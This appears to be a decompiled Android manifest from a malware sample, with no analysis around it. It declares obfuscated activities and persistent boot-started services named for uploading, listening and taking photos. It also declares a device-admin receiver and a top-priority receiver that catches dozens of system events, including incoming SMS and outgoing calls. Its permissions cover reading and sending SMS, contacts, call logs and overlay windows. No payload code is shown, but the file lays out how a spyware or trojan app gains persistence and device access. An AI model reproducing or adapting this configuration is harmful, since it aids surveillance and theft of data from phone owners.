<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" package="com.a">
  <uses-sdk android:minSdkVersion="8" android:targetSdkVersion="8"/>
  <application android:label="@7F050000" android:icon="@7F02001F" android:allowBackup="true">
    <activity android:label="@7F050000" android:name="com.qwe.MainActt" android:excludeFromRecents="true">
      <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
      </intent-filter>
    </activity>
    <activity android:theme="@android:01030007" android:name="com.qwe.Bridgg" android:excludeFromRecents="true">
      <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
      </intent-filter>
    </activity>
    <activity android:name="com.qwe.Actt" android:screenOrientation="1" android:windowSoftInputMode="0x00000005"/>
    <activity android:name="com.qwe.C_LLLP" android:screenOrientation="1"/>
    <activity android:name="com.qwe.SB_CCCC" android:screenOrientation="1" android:windowSoftInputMode="0x00000005"/>
    <activity android:name="com.qwe.Securr" android:screenOrientation="1" android:configChanges="0x000000E0"/>
    <activity android:name="com.qwe.TakePhot" android:screenOrientation="1" android:configChanges="0x000000E0"/>
    <activity android:theme="@android:01030007" android:name="com.qwe.F" android:screenOrientation="1"/>
    <receiver android:label="@7F050000" android:name="com.a.MyAdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN" android:description="@7F050000">
      <meta-data android:name="android.app.device_admin" android:resource="@7F040000"/>
      <intent-filter>
        <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
      </intent-filter>
    </receiver>
    <receiver android:name="com.a.Bo" android:enabled="true" android:exported="true">
      <intent-filter android:priority="2147483647">
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
        <action android:name="android.intent.action.ACTION_SHUTDOWN"/>
        <action android:name="android.intent.action.USER_PRESENT"/>
      </intent-filter>
    </receiver>
    <receiver android:name="com.a.A114">
      <intent-filter android:priority="2147483647">
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
        <action android:name="android.intent.action.PHONE_STATE"/>
        <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
        <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
        <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
        <action android:name="android.intent.action.TIMEZONE_CHANGED"/>
        <action android:name="android.intent.action.TIME_SET"/>
        <action android:name="android.intent.action.TIME_TICK"/>
        <action android:name="android.intent.action.UID_REMOVED"/>
        <action android:name="android.intent.action.UMS_CONNECTED"/>
        <action android:name="android.intent.action.UMS_DISCONNECTED"/>
        <action android:name="android.intent.action.PACKAGE_ADDED"/>
        <action android:name="android.intent.action.PACKAGE_CHANGED"/>
        <action android:name="android.intent.action.PACKAGE_DATA_CLEARED"/>
        <action android:name="android.intent.action.PACKAGE_FIRST_LAUNCH"/>
        <action android:name="android.intent.action.PACKAGE_FULLY_REMOVED"/>
        <action android:name="android.intent.action.PACKAGE_INSTALL"/>
        <action android:name="android.intent.action.PACKAGE_NEEDS_VERIFICATION"/>
        <action android:name="android.intent.action.PACKAGE_REPLACED"/>
        <action android:name="android.intent.action.PACKAGE_REMOVED"/>
        <action android:name="android.intent.action.PACKAGE_RESTARTED"/>
        <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
        <action android:name="android.intent.action.MEDIA_UNMOUNTED"/>
        <action android:name="android.intent.action.MEDIA_UNMOUNTABLE"/>
        <action android:name="android.intent.action.PACKAGE_REMOVED"/>
        <action android:name="android.intent.action.PACKAGE_REMOVED"/>
        <action android:name="android.intent.action.MANAGE_PACKAGE_STORAGE"/>
        <action android:name="android.intent.action.MEDIA_BAD_REMOVAL"/>
        <action android:name="android.intent.action.MEDIA_BUTTON"/>
        <action android:name="android.intent.action.MEDIA_CHECKING"/>
        <action android:name="android.intent.action.MEDIA_EJECT"/>
        <action android:name="android.intent.action.MEDIA_MOUNTED"/>
        <action android:name="android.intent.action.MEDIA_NOFS"/>
        <action android:name="android.intent.action.MEDIA_REMOVED"/>
        <action android:name="android.intent.action.MEDIA_SCANNER_FINISHED"/>
        <action android:name="android.intent.action.MEDIA_SCANNER_SCAN_FILE"/>
        <action android:name="android.intent.action.MEDIA_SCANNER_STARTED"/>
        <action android:name="android.intent.action.MEDIA_SHARED"/>
        <action android:name="android.intent.action.LOCALE_CHANGED"/>
        <action android:name="android.intent.action.INPUT_METHOD_CHANGED"/>
        <action android:name="android.intent.action.HEADSET_PLUG"/>
        <action android:name="android.intent.action.GTALK_DISCONNECTED"/>
        <action android:name="android.intent.action.GTALK_CONNECTED"/>
        <action android:name="android.intent.action.EXTERNAL_APPLICATIONS_UNAVAILABLE"/>
        <action android:name="android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE"/>
        <action android:name="android.intent.action.DOCK_EVENT"/>
        <action android:name="android.intent.action.DEVICE_STORAGE_OK"/>
        <action android:name="android.intent.action.DEVICE_STORAGE_LOW"/>
        <action android:name="android.intent.action.DATE_CHANGED"/>
        <action android:name="android.intent.action.CLOSE_SYSTEM_DIALOGS"/>
        <action android:name="android.intent.action.CAMERA_BUTTON"/>
        <action android:name="android.intent.action.BATTERY_OKAY"/>
        <action android:name="android.intent.action.BATTERY_LOW"/>
        <action android:name="android.intent.action.BATTERY_CHANGED"/>
        <action android:name="android.intent.action.AIRPLANE_MODE"/>
        <action android:name="android.intent.action.PROVIDER_CHANGED"/>
        <action android:name="android.intent.action.ACTION_SHUTDOWN"/>
        <action android:name="android.intent.action.USER_PRESENT"/>
        <action android:name="android.intent.action.WALLPAPER_CHANGED"/>
        <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
        <action android:name="com.noshufou.android.su.REQUEST"/>
        <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
        <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
        <category android:name="android.intent.category.HOME"/>
      </intent-filter>
    </receiver>
    <service android:name="com.qwe.service.AutBann" android:persistent="true" android:enabled="true">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
      </intent-filter>
    </service>
    <service android:name="com.qwe.service.SMM" android:persistent="true" android:enabled="true">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
      </intent-filter>
    </service>
    <service android:name="com.qwe.service.Intee" android:persistent="true" android:enabled="true">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
      </intent-filter>
    </service>
    <service android:name="com.qwe.service.InLitt" android:persistent="true" android:enabled="true">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
      </intent-filter>
    </service>
    <service android:name="com.qwe.service.UploadServv" android:persistent="true" android:enabled="true">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
      </intent-filter>
    </service>
    <service android:name="com.qwe.service.Hear" android:persistent="true" android:enabled="true">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
      </intent-filter>
    </service>
  </application>
  <uses-permission android:name="android.permission.VIBRATE"/>
  <uses-permission android:name="android.permission.READ_SMS"/>
  <uses-permission android:name="android.permission.WRITE_SMS"/>
  <uses-permission android:name="android.permission.RECEIVE_SMS"/>
  <uses-permission android:name="android.permission.SEND_SMS"/>
  <uses-permission android:name="android.permission.READ_CONTACTS"/>
  <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
  <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
  <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
  <uses-permission android:name="android.permission.CALL_PHONE"/>
  <uses-permission android:name="android.permission.READ_CALL_LOG"/>
  <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
  <uses-permission android:name="android.permission.INTERNET"/>
  <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
  <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
  <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
  <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
  <uses-permission android:name="android.permission.UPDATE_APP_OPS_STATS"/>
  <uses-permission android:name="android.permission.GET_TASKS"/>
  <uses-permission android:name="android.permission.VIBRATE"/>
  <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
  <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
  <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
  <uses-permission android:name="android.permission.WAKE_LOCK"/>
</manifest>
